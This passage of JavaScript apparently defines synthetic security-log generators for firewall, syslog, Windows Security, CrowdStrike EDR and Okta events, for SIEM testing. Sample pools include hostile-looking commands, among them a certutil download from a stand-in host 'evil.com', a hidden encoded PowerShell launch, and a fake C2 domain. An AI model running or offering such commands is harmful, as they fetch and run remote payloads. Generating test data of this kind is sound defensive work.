      {"name":"rule","type":"string","config":{"pool":["Allow-Outbound","Allow-DNS","Deny-All","Allow-Web","DMZ-Inbound","Corp-Egress","VPN-Access","Block-Malware","Guest-WiFi","Partner-VPN","Allow-SMTP","Allow-SSH","Block-Tor","Allow-ICMP","DC-Replication","Mgmt-Access"]}},
      {"name":"srcuser","type":"username","config":{"domain":"corp\\","pattern":"{first}.{last}"}},
      {"name":"dstuser","type":"string","config":{"pool":[""]}},
      {"name":"app","type":"enum","config":{"values":["ssl","web-browsing","dns","ms-office365","zoom","ms-teams","github-base","incomplete","smtp","ssh","ldap","slack","icmp"],"weights":[0.12,0.12,0.1,0.08,0.06,0.06,0.05,0.04,0.05,0.04,0.04,0.05,0.04]}},
      {"name":"vsys","type":"string","config":{"pool":["vsys1"]}},
      {"name":"sz","type":"enum","config":{"values":["trust","untrust","dmz","vpn"],"weights":[0.5,0.25,0.15,0.1]}},
      {"name":"dz","type":"enum","config":{"values":["untrust","trust","dmz","vpn"],"weights":[0.5,0.25,0.15,0.1]}},
      {"name":"inif","type":"enum","config":{"values":["ethernet1/1","ethernet1/2","ethernet1/3","ethernet1/4","ethernet1/5","ethernet1/6"],"weights":[0.25,0.2,0.18,0.15,0.12,0.1]}},
      {"name":"outif","type":"enum","config":{"values":["ethernet1/1","ethernet1/2","ethernet1/3","ethernet1/4","ethernet1/5","ethernet1/6"],"weights":[0.25,0.2,0.18,0.15,0.12,0.1]}},
      {"name":"logfwd","type":"string","config":{"pool":["Log-Forwarding-Default"]}},
      {"name":"sessid","type":"int","config":{"min":100000,"max":9999999}},
      {"name":"rpt","type":"int","config":{"min":1,"max":12}},
      {"name":"sp","type":"port","config":{"type":"ephemeral"}},
      {"name":"dp","type":"port","config":{"common":[443,80,53,8080,22,25],"weights":[0.32,0.22,0.18,0.12,0.08,0.08]}},
      {"name":"nsp","type":"port","config":{"type":"ephemeral"}},
      {"name":"ndp","type":"port","config":{"common":[443,80],"weights":[0.6,0.4]}},
      {"name":"flags","type":"string","config":{"pool":["0x400000","0x19","0x400019","0x64","0x400064","0x6400","0x80000000","0x400053","0x200000","0x0"]}},
      {"name":"proto","type":"enum","config":{"values":["tcp","udp","icmp"],"weights":[0.7,0.25,0.05]}},
      {"name":"action","type":"enum","config":{"values":["allow","deny","drop","reset-both"],"weights":[0.85,0.07,0.05,0.03]}},
      {"name":"bytes","type":"int","config":{"min":60,"max":524288}},
      {"name":"sent","type":"int","config":{"min":40,"max":262144}},
      {"name":"rcvd","type":"int","config":{"min":40,"max":262144}},
      {"name":"pkts","type":"int","config":{"min":1,"max":5000}},
      {"name":"start","type":"timestamp","config":{"format":"YYYY/MM/DD HH:mm:ss","jitterMs":30000}},
      {"name":"elapsed","type":"int","config":{"min":0,"max":3600}},
      {"name":"cat","type":"enum","config":{"values":["general-internet","business-and-economy","computer-and-internet-info","content-delivery-networks","encrypted-tunnel","low-risk","unknown","social-networking","streaming-media","software-updates"],"weights":[0.12,0.11,0.1,0.1,0.1,0.09,0.08,0.08,0.07,0.06]}},
      {"name":"seqno","type":"int","config":{"min":1,"max":99999999}},
      {"name":"aflags","type":"string","config":{"pool":["0x8000000000000000","0x0"]}},
      {"name":"sloc","type":"enum","config":{"values":["10.0.0.0-10.255.255.255","192.168.0.0-192.168.255.255","United States","United Kingdom","Canada","Germany","France","Japan","Australia"],"weights":[0.25,0.15,0.15,0.08,0.07,0.07,0.06,0.06,0.06]}},
      {"name":"dloc","type":"enum","config":{"values":["United States","10.0.0.0-10.255.255.255","Ireland","Germany","France","Netherlands","Japan","Singapore","Canada","Australia"],"weights":[0.2,0.15,0.1,0.1,0.08,0.08,0.07,0.07,0.08,0.07]}},
      {"name":"ps","type":"int","config":{"min":1,"max":2500}},
      {"name":"pr","type":"int","config":{"min":1,"max":2500}},
      {"name":"endr","type":"enum","config":{"values":["tcp-fin","tcp-rst-from-client","tcp-rst-from-server","aged-out","threat","policy-deny","tcp-reuse","resources-unavailable","n/a"],"weights":[0.3,0.14,0.1,0.12,0.08,0.08,0.06,0.05,0.07]}}
    ],
    "template":"{{recv}},{{serial}},{{type}},{{subtype}},{{gen}},{{src}},{{dst}},{{natsrc}},{{natdst}},{{rule}},{{srcuser}},{{dstuser}},{{app}},{{vsys}},{{sz}},{{dz}},{{inif}},{{outif}},{{logfwd}},{{sessid}},{{rpt}},{{sp}},{{dp}},{{nsp}},{{ndp}},{{flags}},{{proto}},{{action}},{{bytes}},{{sent}},{{rcvd}},{{pkts}},{{start}},{{elapsed}},{{cat}},{{seqno}},{{aflags}},{{sloc}},{{dloc}},{{ps}},{{pr}},{{endr}}"
  },

  'syslog': {
    "sourcetype":"syslog","vendor":"Generic","product":"Syslog","format":"syslog_rfc5424",
    "description":"RFC 5424 syslog messages",
    "fields":[
      {"name":"fac","type":"enum","config":{"values":[0,1,2,3,4,5,6,9,10,11,16,17,18,19,20,21,22,23],"names":["kern","user","mail","daemon","auth","syslog","lpr","cron","authpriv","ftp","local0","local1","local2","local3","local4","local5","local6","local7"],"weights":[0.06,0.1,0.03,0.12,0.14,0.04,0.02,0.08,0.09,0.02,0.08,0.04,0.03,0.03,0.03,0.03,0.03,0.03]}},
      {"name":"sev","type":"enum","config":{"values":[0,1,2,3,4,5,6,7],"names":["emerg","alert","crit","err","warning","notice","info","debug"],"weights":[0.01,0.02,0.03,0.08,0.12,0.2,0.4,0.14]}},
      {"name":"ts","type":"timestamp","config":{"format":"iso","jitterMs":5000}},
      {"name":"host","type":"hostname","config":{"pool":["web-prod-01","web-prod-02","app-prod-01","app-prod-02","db-prod-01","db-prod-02","lb-prod-01","mail-prod-01","monitor-01","jump-01","cache-prod-01","queue-prod-01","search-prod-01","api-prod-01","worker-prod-01","vault-prod-01","dns-prod-01","nfs-prod-01","log-collector-01"]}},
      {"name":"app","type":"enum","config":{"values":["sshd","sudo","CRON","systemd","kernel","nginx","postfix","dockerd","auditd","fail2ban","rsyslogd","haproxy","postgres","mysqld","redis-server"],"weights":[0.1,0.07,0.08,0.1,0.08,0.1,0.05,0.07,0.08,0.06,0.04,0.05,0.05,0.04,0.03]}},
      {"name":"pid","type":"int","config":{"min":100,"max":65535}},
      {"name":"sd","type":"string","config":{"pool":["-","[timeQuality tzKnown=\"1\" isSynced=\"1\"]"]}},
      {"name":"sip","type":"ip","config":{"internal":[{"cidr":"10.0.0.0/8","weight":0.6}],"external":[{"cidr":"0.0.0.0/0","weight":0.4}]}},
      {"name":"spt","type":"port","config":{"type":"ephemeral"}},
      {"name":"usr","type":"username","config":{"pool":["root","admin","deploy","www-data","ubuntu","nginx","postgres","mysql","redis","elasticsearch","docker","jenkins","ansible","terraform","vault","consul","nobody","daemon","syslog"],"pattern":"{first}.{last}"}}
    ],
    "variants":{
      "sshd_ok":{"weight":0.10,"fields":{"am":{"type":"enum","config":{"values":["publickey","password"],"weights":[0.7,0.3]}}},"template":"<{{pri}}>1 {{ts}} {{host}} sshd {{pid}} - {{sd}} Accepted {{am}} for {{usr}} from {{sip}} port {{spt}} ssh2"},
      "sshd_fail":{"weight":0.06,"fields":{},"template":"<{{pri}}>1 {{ts}} {{host}} sshd {{pid}} - {{sd}} Failed password for {{usr}} from {{sip}} port {{spt}} ssh2"},
      "sshd_inv":{"weight":0.04,"fields":{},"template":"<{{pri}}>1 {{ts}} {{host}} sshd {{pid}} - {{sd}} Invalid user {{usr}} from {{sip}} port {{spt}}"},
      "sudo":{"weight":0.08,"fields":{"cmd":{"type":"string","config":{"pool":["/usr/bin/systemctl restart nginx","/usr/bin/yum update -y","/usr/bin/docker ps","/usr/sbin/iptables -L","/usr/bin/systemctl status sshd","/usr/bin/journalctl -xe","/usr/bin/apt-get upgrade -y","/usr/bin/tail -f /var/log/syslog"]}}},"template":"<{{pri}}>1 {{ts}} {{host}} sudo {{pid}} - {{sd}} {{usr}} : TTY=pts/0 ; PWD=/home/{{usr}} ; USER=root ; COMMAND={{cmd}}"},
      "cron":{"weight":0.10,"fields":{"cj":{"type":"string","config":{"pool":["/usr/lib/sa/sa1 1 1","/usr/sbin/logrotate /etc/logrotate.conf","/opt/scripts/backup.sh","/usr/bin/find /tmp -mtime +7 -delete","/opt/scripts/health-check.sh","/usr/local/bin/cert-renew.sh"]}}},"template":"<{{pri}}>1 {{ts}} {{host}} CRON {{pid}} - {{sd}} ({{usr}}) CMD ({{cj}})"},
      "systemd":{"weight":0.12,"fields":{"svc":{"type":"string","config":{"pool":["nginx.service","docker.service","sshd.service","crond.service","postgresql.service","redis.service","elasticsearch.service","haproxy.service","kubelet.service","containerd.service"]}},"act":{"type":"enum","config":{"values":["Started","Stopped","Starting","Stopping","Reloading","Failed"],"weights":[0.3,0.2,0.15,0.12,0.13,0.1]}}},"template":"<{{pri}}>1 {{ts}} {{host}} systemd {{pid}} - {{sd}} {{act}} {{svc}}."},
      "kernel":{"weight":0.08,"fields":{"km":{"type":"string","config":{"pool":["[UFW BLOCK] IN=eth0 SRC={{sip}} PROTO=TCP SPT={{spt}} DPT=22","EXT4-fs (sda1): mounted filesystem","nf_conntrack: table full, dropping packet","Out of memory: Kill process 12345 (java) score 950","TCP: request_sock_TCP: Possible SYN flooding on port 443"]}}},"template":"<{{pri}}>1 {{ts}} {{host}} kernel - - {{sd}} {{km}}"},
      "nginx":{"weight":0.10,"fields":{"m":{"type":"enum","config":{"values":["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD"],"weights":[0.55,0.18,0.07,0.05,0.06,0.05,0.04]}},"p":{"type":"string","config":{"pool":["/","/api/v1/users","/api/v1/health","/login","/favicon.ico","/metrics","/api/v2/events","/api/v1/auth/token","/api/v1/search","/dashboard","/static/js/app.min.js"]}},"sc":{"type":"enum","config":{"values":["200","201","204","301","304","400","401","403","404","500","502","503"],"weights":[0.45,0.05,0.03,0.05,0.08,0.05,0.04,0.03,0.08,0.05,0.03,0.06]}},"rb":{"type":"int","config":{"min":0,"max":524288}}},"template":"<{{pri}}>1 {{ts}} {{host}} nginx {{pid}} - {{sd}} {{sip}} - - \"{{m}} {{p}} HTTP/1.1\" {{sc}} {{rb}}"},
      "postfix":{"weight":0.05,"fields":{"qid":{"type":"string","config":{"pattern":"{random_hex:10}"}},"ms":{"type":"enum","config":{"values":["sent","deferred","bounced"],"weights":[0.7,0.2,0.1]}},"to":{"type":"email","config":{"domain":"example.com"}}},"template":"<{{pri}}>1 {{ts}} {{host}} postfix/smtp {{pid}} - {{sd}} {{qid}}: to=<{{to}}>, status={{ms}}"},
      "generic":{"weight":0.27,"fields":{"gm":{"type":"string","config":{"pool":["process started successfully","configuration reloaded","health check passed","connection pool initialized with 25 connections","cache warmed up, 15432 entries loaded","worker thread pool resized to 8","TLS certificate valid for 89 days","background job completed in 1.23s","rate limiter reset for interval","session cleanup: removed 47 expired sessions","disk usage at 67%, threshold 85%","memory usage: 2.1GB / 4.0GB","CPU load average: 0.45 0.62 0.71"]}}},"template":"<{{pri}}>1 {{ts}} {{host}} {{app}} {{pid}} - {{sd}} {{gm}}"}
    },
    "template":"<{{pri}}>1 {{ts}} {{host}} {{app}} {{pid}} - {{sd}} {{msg}}",
    "priorityCalc":"fac * 8 + sev"
  },

  'WinEventLog:Security': {
    "sourcetype":"WinEventLog:Security","vendor":"Microsoft","product":"Windows","format":"xml",
    "description":"Windows Security Event Log",
    "xmlHeader":"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{{G}}'/><EventID>{{EID}}</EventID><Level>0</Level><Task>{{TK}}</Task><Keywords>{{KW}}</Keywords><TimeCreated SystemTime='{{T}}'/><EventRecordID>{{R}}</EventRecordID><Computer>{{C}}</Computer></System>",
    "xmlFooter":"</Event>",
    "fields":[
      {"name":"T","type":"timestamp","config":{"format":"iso","jitterMs":3000}},
      {"name":"C","type":"hostname","config":{"pool":["DC01.corp.contoso.com","DC02.corp.contoso.com","FS01.corp.contoso.com","WKS-IT-PC01.corp.contoso.com","WKS-FIN-PC01.corp.contoso.com","WKS-HR-PC01.corp.contoso.com","WKS-ENG-PC08.corp.contoso.com","SRV-SQL01.corp.contoso.com","SRV-WEB01.corp.contoso.com","SRV-APP01.corp.contoso.com","LAPTOP-A3B7C9D.corp.contoso.com"]}},
      {"name":"G","type":"string","config":{"pool":["{54849625-5478-4994-A5BA-3E3B0328C30D}"]}},
      {"name":"D","type":"string","config":{"pool":["CORP","CONTOSO","ACME","NORTHWIND","FABRIKAM"]}},
      {"name":"U","type":"username","config":{"pattern":"{first}.{last}"}},
      {"name":"SID","type":"string","config":{"pattern":"S-1-5-21-3623811015-3361044348-30300820-{random:4}"}},
      {"name":"IP","type":"ip","config":{"internal":[{"cidr":"10.0.0.0/8","weight":0.7}],"external":[{"cidr":"0.0.0.0/0","weight":0.3}]}},
      {"name":"PT","type":"port","config":{"type":"ephemeral"}},
      {"name":"WS","type":"hostname","config":{"pool":["WKS-IT-PC01","WKS-IT-PC02","WKS-FIN-PC01","WKS-HR-PC01","WKS-ENG-PC08","LAPTOP-A3B7C9D","LAPTOP-K8M2P4Q","SRV-SQL01","SRV-WEB01","DC01","DC02"]}},
      {"name":"LP","type":"enum","config":{"values":["Kerberos","NtLmSsp","User32"],"weights":[0.45,0.3,0.25]}},
      {"name":"AP","type":"enum","config":{"values":["Kerberos","NTLM","Negotiate"],"weights":[0.5,0.3,0.2]}},
      {"name":"LG","type":"uuid","config":{}},
      {"name":"SU","type":"string","config":{"pool":["-","SYSTEM"]}},
      {"name":"SD","type":"string","config":{"pool":["-","NT AUTHORITY"]}},
      {"name":"SS","type":"string","config":{"pool":["S-1-0-0","S-1-5-18"]}},
      {"name":"R","type":"int","config":{"min":100000,"max":99999999}},
      {"name":"NP","type":"path","config":{"pool":["C:\\Windows\\System32\\cmd.exe","C:\\Windows\\System32\\powershell.exe","C:\\Windows\\System32\\svchost.exe","C:\\Windows\\explorer.exe","C:\\Windows\\System32\\lsass.exe","C:\\Windows\\System32\\csrss.exe","C:\\Windows\\System32\\conhost.exe","C:\\Windows\\System32\\mmc.exe","C:\\Windows\\System32\\net.exe","C:\\Windows\\System32\\reg.exe","C:\\Windows\\System32\\certutil.exe","C:\\Windows\\System32\\rundll32.exe","C:\\Program Files\\Windows Defender\\MsMpEng.exe"]}},
      {"name":"CL","type":"string","config":{"pool":["cmd /c whoami","powershell -ep bypass","net user /domain","svchost -k netsvcs","cmd /c ipconfig /all","net localgroup administrators","net share","tasklist /v","systeminfo","powershell Get-Process"]}},
      {"name":"PP","type":"path","config":{"pool":["C:\\Windows\\System32\\cmd.exe","C:\\Windows\\explorer.exe","C:\\Windows\\System32\\svchost.exe","C:\\Windows\\System32\\services.exe","C:\\Windows\\System32\\wininit.exe","C:\\Windows\\System32\\lsass.exe"]}}
    ],
    "variants":{
      "4624":{"weight":0.40,
        "fields":{"EID":"4624","TK":"12544","KW":"0x8020000000000000","LT":{"type":"enum","config":{"values":["2","3","7","10"],"weights":[0.15,0.55,0.15,0.15]}}},
        "eventData":[["SubjectUserSid","{{SS}}"],["TargetUserSid","{{SID}}"],["TargetUserName","{{U}}"],["TargetDomainName","{{D}}"],["LogonType","{{LT}}"],["LogonProcessName","{{LP}}"],["AuthenticationPackageName","{{AP}}"],["WorkstationName","{{WS}}"],["IpAddress","{{IP}}"],["IpPort","{{PT}}"]]},
      "4625":{"weight":0.15,
        "fields":{"EID":"4625","TK":"12544","KW":"0x8010000000000000","LT":{"type":"enum","config":{"values":["2","3","10"],"weights":[0.2,0.6,0.2]}},"ST":{"type":"enum","config":{"values":["0xC000006D","0xC000006A","0xC0000064"],"weights":[0.4,0.35,0.25]}},"SST":{"type":"enum","config":{"values":["0xC000006A","0xC0000064"],"weights":[0.6,0.4]}}},
        "eventData":[["TargetUserName","{{U}}"],["TargetDomainName","{{D}}"],["Status","{{ST}}"],["SubStatus","{{SST}}"],["LogonType","{{LT}}"],["AuthenticationPackageName","{{AP}}"],["WorkstationName","{{WS}}"],["IpAddress","{{IP}}"]]},
      "4672":{"weight":0.15,
        "fields":{"EID":"4672","TK":"12548","KW":"0x8020000000000000","PL":{"type":"string","config":{"pool":["SeSecurityPrivilege SeBackupPrivilege SeDebugPrivilege","SeTcbPrivilege SeSecurityPrivilege SeBackupPrivilege","SeAssignPrimaryTokenPrivilege SeIncreaseQuotaPrivilege","SeRestorePrivilege SeShutdownPrivilege SeTakeOwnershipPrivilege"]}}},
        "eventData":[["SubjectUserSid","{{SID}}"],["SubjectUserName","{{U}}"],["SubjectDomainName","{{D}}"],["PrivilegeList","{{PL}}"]]},
      "4688":{"weight":0.15,
        "fields":{"EID":"4688","TK":"13312","KW":"0x8020000000000000","PID":{"type":"string","config":{"pattern":"0x{random_hex:4}"}},"TE":{"type":"enum","config":{"values":["%%1936","%%1937","%%1938"],"weights":[0.6,0.25,0.15]}}},
        "eventData":[["SubjectUserSid","{{SID}}"],["SubjectUserName","{{U}}"],["NewProcessId","{{PID}}"],["NewProcessName","{{NP}}"],["TokenElevationType","{{TE}}"],["CommandLine","{{CL}}"],["ParentProcessName","{{PP}}"]]},
      "4720":{"weight":0.05,
        "fields":{"EID":"4720","TK":"13824","KW":"0x8020000000000000","UPN":{"type":"email","config":{"domain":"contoso.com"}}},
        "eventData":[["SubjectUserName","{{SU}}"],["TargetUserName","{{U}}"],["TargetDomainName","{{D}}"],["TargetSid","{{SID}}"],["UserPrincipalName","{{UPN}}"]]},
      "4740":{"weight":0.10,
        "fields":{"EID":"4740","TK":"13824","KW":"0x8020000000000000"},
        "eventData":[["TargetUserName","{{U}}"],["TargetDomainName","{{D}}"],["TargetSid","{{SID}}"],["SubjectUserName","{{SU}}"]]}
    },
    "template":"xml_event"
  },

  'crowdstrike:falcon:event': {
    "sourcetype":"crowdstrike:falcon:event","vendor":"CrowdStrike","product":"Falcon","format":"json",
    "description":"CrowdStrike Falcon EDR events",
    "templatePrefix":"{\"metadata\":{\"customerIDString\":\"{{cid}}\",\"eventType\":\"{{etype}}\"},\"event\":{\"event_simpleName\":\"{{esn}}\",\"timestamp\":{{ts}},\"aid\":\"{{aid}}\",\"ComputerName\":\"{{host}}\",\"UserName\":\"{{usr}}\",",
    "templateSuffix":"}}",
    "fields":[
      {"name":"ts","type":"timestamp","config":{"format":"epoch_ms","jitterMs":3000}},
      {"name":"aid","type":"hash","config":{"algorithm":"random_hex","length":32}},
      {"name":"cid","type":"string","config":{"pool":["a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4","b7e9f2a1c8d4b3e6f7a9c2d5e8b1f3a4","c3d8e7f1a4b9c2d6e5f8a3b7c1d4e9f2"]}},
      {"name":"host","type":"hostname","config":{"pool":["WKS-FIN-PC07","WKS-IT-PC01","WKS-HR-PC03","SRV-DC01","SRV-FILE01","LAPTOP-A3B7C9D","SRV-SQL01","WKS-FIN-PC01","WKS-IT-PC02","WKS-ENG-PC08","SRV-WEB01","SRV-APP01","LAPTOP-K8M2P4Q"]}},
      {"name":"dom","type":"string","config":{"pool":["CORP.CONTOSO.COM","CONTOSO.COM","WORKGROUP","ACME.LOCAL","NORTHWIND.COM"]}},
      {"name":"sevn","type":"enum","config":{"values":["Informational","Low","Medium","High","Critical"],"weights":[0.3,0.25,0.2,0.15,0.1]}},
      {"name":"sev","type":"enum","config":{"values":[1,2,3,4,5],"weights":[0.3,0.25,0.2,0.15,0.1]}},
      {"name":"usr","type":"username","config":{"pattern":"{first}.{last}"}},
      {"name":"sha","type":"hash","config":{"algorithm":"sha256"}},
      {"name":"fp","type":"path","config":{"pool":["\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\powershell.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\rundll32.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\svchost.exe","\\Device\\HarddiskVolume3\\Windows\\explorer.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\conhost.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\certutil.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\net.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\reg.exe"]}},
      {"name":"cmd","type":"string","config":{"pool":["cmd.exe /c whoami /all","powershell.exe -nop -w hidden -enc SQBm","net user /domain","certutil.exe -urlcache -f http://evil.com/p.exe","svchost.exe -k netsvcs","explorer.exe","powershell.exe -ep bypass -file C:\\temp\\script.ps1","cmd.exe /c ipconfig /all","net localgroup administrators","wmic process list brief"]}},
      {"name":"ppid","type":"int","config":{"min":100,"max":65535}},
      {"name":"tpid","type":"int","config":{"min":100,"max":65535}},
      {"name":"lip","type":"ip","config":{"internal":[{"cidr":"10.0.0.0/8","weight":0.6},{"cidr":"192.168.0.0/16","weight":0.4}]}},
      {"name":"rip","type":"ip","config":{"external":[{"cidr":"0.0.0.0/0","weight":1}]}},
      {"name":"rpt","type":"port","config":{"common":[443,80,53,22,445,3389],"weights":[0.35,0.22,0.15,0.1,0.09,0.09]}}
    ],
    "variants":{
      "detect":{"weight":0.20,
        "fields":{"etype":"DetectionSummaryEvent","esn":"SuspiciousActivity","dn":{"type":"enum","config":{"values":["Suspicious PowerShell","Credential Dumping","Lateral Movement","Defense Evasion","Malicious Script","Registry Persistence","Ransomware","Process Injection","DLL Side-Loading","Fileless Malware"],"weights":[0.14,0.12,0.11,0.11,0.1,0.09,0.08,0.09,0.08,0.08]}},"tac":{"type":"enum","config":{"values":["Execution","CredentialAccess","LateralMovement","DefenseEvasion","Persistence","Discovery","CommandAndControl","InitialAccess"],"weights":[0.15,0.14,0.13,0.13,0.12,0.12,0.11,0.1]}},"tech":{"type":"enum","config":{"values":["T1059.001","T1003.001","T1021.002","T1218.011","T1547.001","T1082","T1071.001","T1055.001","T1574.002","T1059.003"],"weights":[0.13,0.12,0.11,0.11,0.1,0.1,0.09,0.09,0.08,0.07]}}},
        "bodyTemplate":"\"DetectName\":\"{{dn}}\",\"SeverityName\":\"{{sevn}}\",\"Severity\":{{sev}},\"Tactic\":\"{{tac}}\",\"Technique\":\"{{tech}}\",\"FilePath\":\"{{fp}}\",\"CommandLine\":\"{{cmd}}\",\"SHA256HashData\":\"{{sha}}\""},
      "proc":{"weight":0.30,
        "fields":{"etype":"ProcessRollup2","esn":"ProcessRollup2"},
        "bodyTemplate":"\"FilePath\":\"{{fp}}\",\"CommandLine\":\"{{cmd}}\",\"SHA256HashData\":\"{{sha}}\",\"ParentProcessId\":{{ppid}},\"TargetProcessId\":{{tpid}}"},
      "net":{"weight":0.20,
        "fields":{"etype":"NetworkConnectIP4","esn":"NetworkConnectIP4","dir":{"type":"enum","config":{"values":["0","1"],"weights":[0.4,0.6]}},"proto":{"type":"enum","config":{"values":["6","17"],"weights":[0.8,0.2]}}},
        "bodyTemplate":"\"LocalIP\":\"{{lip}}\",\"RemoteIP\":\"{{rip}}\",\"RemotePort\":{{rpt}},\"ConnectionDirection\":\"{{dir}}\",\"Protocol\":\"{{proto}}\""},
      "dns":{"weight":0.15,
        "fields":{"etype":"DnsRequest","esn":"DnsRequest","qn":{"type":"string","config":{"pool":["login.microsoftonline.com","www.google.com","api.github.com","zoom.us","outlook.office365.com","evil-c2.xyz","s3.amazonaws.com","graph.microsoft.com","accounts.google.com","slack.com","api.crowdstrike.com","telemetry.microsoft.com"]}},"rt":{"type":"enum","config":{"values":["A","AAAA","CNAME","MX","TXT","SRV"],"weights":[0.5,0.2,0.12,0.06,0.07,0.05]}}},
        "bodyTemplate":"\"DomainName\":\"{{qn}}\",\"RequestType\":\"{{rt}}\""},
      "logon":{"weight":0.15,
        "fields":{"etype":"UserLogon","esn":"UserLogon","lt":{"type":"enum","config":{"values":["Interactive","Network","RemoteInteractive","Service"],"weights":[0.35,0.3,0.2,0.15]}}},
        "bodyTemplate":"\"LogonType\":\"{{lt}}\",\"MachineDomain\":\"{{dom}}\""}
    },
    "template":"{{templatePrefix}}{{bodyTemplate}}{{templateSuffix}}"
  },

  'okta:system': {
    "sourcetype":"okta:system","vendor":"Okta","product":"Okta Identity Cloud","format":"json",
    "description":"Okta System Log events",
    "fields":[
      {"name":"uuid","type":"uuid","config":{}},
      {"name":"pub","type":"timestamp","config":{"format":"iso","jitterMs":5000}},
      {"name":"sev","type":"enum","config":{"values":["DEBUG","INFO","WARN","ERROR"],"weights":[0.05,0.65,0.2,0.1]}},
      {"name":"aid","type":"string","config":{"pattern":"00u{random:12}"}},
      {"name":"at","type":"enum","config":{"values":["User","SystemPrincipal"],"weights":[0.9,0.1]}},
      {"name":"ae","type":"email","config":{"domains":["contoso.com"]}},
      {"name":"an","type":"username","config":{"pattern":"{First} {Last}"}},
      {"name":"cip","type":"ip","config":{"internal":[{"cidr":"10.0.0.0/8","weight":0.4}],"external":[{"cidr":"0.0.0.0/0","weight":0.6}]}},
      {"name":"cua","type":"useragent","config":{}},
      {"name":"cz","type":"enum","config":{"values":["null","DefaultNetwork","CorporateVPN"],"weights":[0.35,0.35,0.3]}},
      {"name":"cd","type":"enum","config":{"values":["Computer","Mobile","Unknown","Tablet","ChromeOS","MacOS","Windows","Linux"],"weights":[0.3,0.2,0.08,0.06,0.06,0.1,0.12,0.08]}},
      {"name":"gc","type":"string","config":{"pool":["San Francisco","New York","Chicago","Seattle","London","Los Angeles","Austin","Denver","Boston","Atlanta","Toronto","Vancouver","Dublin","Frankfurt","Amsterdam","Tokyo","Singapore","Sydney","Mumbai","Sao Paulo"]}},
      {"name":"gk","type":"string","config":{"pool":["US","US","US","US","GB","US","US","US","US","US","CA","CA","IE","DE","NL","JP","SG","AU","IN","BR"]}},
      {"name":"out","type":"enum","config":{"values":["SUCCESS","FAILURE","SKIPPED"],"weights":[0.78,0.15,0.07]}},
      {"name":"tid","type":"string","config":{"pattern":"00u{random:12}"}},
      {"name":"ta","type":"string","config":{"pool":["Salesforce","Office 365","AWS Console","Slack","Zoom","GitHub","Okta Dashboard","Google Workspace","Jira","Confluence","ServiceNow","Workday"]}},
      {"name":"txn","type":"uuid","config":{}},
      {"name":"ap","type":"enum","config":{"values":["OKTA_AUTHENTICATION_PROVIDER","ACTIVE_DIRECTORY","LDAP","SOCIAL","FEDERATION","CUSTOM"],"weights":[0.4,0.3,0.1,0.08,0.07,0.05]}},
      {"name":"mf","type":"enum","config":{"values":["OKTA_VERIFY","SMS","EMAIL","GOOGLE_AUTHENTICATOR","FIDO2_WEBAUTHN","OKTA_VERIFY_PUSH"],"weights":[0.25,0.15,0.1,0.15,0.15,0.2]}}
    ],
    "jsonBase":{"uuid":"{{uuid}}","published":"{{pub}}","version":"0","actor":{"id":"{{aid}}","type":"{{at}}","alternateId":"{{ae}}","displayName":"{{an}}"},"transaction":{"type":"{{tt}}","id":"{{txn}}"}},
    "variants":{
      "login":{"weight":0.25,
        "fields":{"et":"user.session.start","dm":"User login to Okta","tt":"WEB"},
        "jsonMerge":{"eventType":"{{et}}","severity":"{{sev}}","displayMessage":"{{dm}}","client":{"userAgent":{"rawUserAgent":"{{cua}}"},"zone":"{{cz}}","device":"{{cd}}","ipAddress":"{{cip}}","geographicalContext":{"city":"{{gc}}","country":"{{gk}}"}},"outcome":{"result":"{{out}}"},"authenticationContext":{"authenticationProvider":"{{ap}}"}}},
      "sso":{"weight":0.25,
        "fields":{"et":"user.authentication.sso","dm":"User single sign on to app","tt":"WEB"},
        "jsonMerge":{"eventType":"{{et}}","severity":"{{sev}}","displayMessage":"{{dm}}","client":{"device":"{{cd}}","ipAddress":"{{cip}}","geographicalContext":{"city":"{{gc}}","country":"{{gk}}"}},"outcome":{"result":"{{out}}"},"target":[{"id":"{{tid}}","type":"AppInstance","displayName":"{{ta}}"}]}},
      "mfa_v":{"weight":0.20,
        "fields":{"et":"user.authentication.auth_via_mfa","dm":"Authentication via MFA","tt":"WEB"},
        "jsonMerge":{"eventType":"{{et}}","severity":"{{sev}}","displayMessage":"{{dm}}","client":{"device":"{{cd}}","ipAddress":"{{cip}}","geographicalContext":{"city":"{{gc}}","country":"{{gk}}"}},"outcome":{"result":"{{out}}"},"target":[{"id":"{{tid}}","type":"AuthenticatorEnrollment","displayName":"{{mf}}"}]}},
      "lock":{"weight":0.10,
        "fields":{"et":"user.account.lock","dm":"Max sign in attempts exceeded","tt":"WEB"},
        "jsonMerge":{"eventType":"{{et}}","severity":"WARN","displayMessage":"{{dm}}","client":{"ipAddress":"{{cip}}","geographicalContext":{"city":"{{gc}}","country":"{{gk}}"}},"outcome":{"result":"FAILURE","reason":"LOCKED_OUT"}}},
      "policy":{"weight":0.15,
        "fields":{"et":"policy.evaluate_sign_on","dm":"Evaluation of sign-on policy","tt":"WEB","pol":{"type":"string","config":{"pool":["Okta Sign On Policy","MFA Required Policy"]}}},
        "jsonMerge":{"eventType":"{{et}}","severity":"{{sev}}","displayMessage":"{{dm}}","client":{"ipAddress":"{{cip}}"},"outcome":{"result":"{{out}}"},"target":[{"id":"{{tid}}","type":"PolicyEntity","displayName":"{{pol}}"}]}},
      "unauth":{"weight":0.05,
        "fields":{"et":"app.generic.unauth_app_access_attempt","dm":"Unauthorized app access","tt":"WEB"},
        "jsonMerge":{"eventType":"{{et}}","severity":"WARN","displayMessage":"{{dm}}","client":{"device":"{{cd}}","ipAddress":"{{cip}}"},"outcome":{"result":"FAILURE","reason":"INVALID_CREDENTIALS"},"target":[{"id":"{{tid}}","type":"AppInstance","displayName":"{{ta}}"}]}}
    },
    "template":"json_merge"
  }
};

// Sourcetype alias map for detailed definitions
const SOURCETYPE_ALIASES = {
  'pan:traffic':              'pan:traffic',
  'palo-alto-traffic':        'pan:traffic',
  'WinEventLog:Security':     'WinEventLog:Security',
  'windows-security':         'WinEventLog:Security',
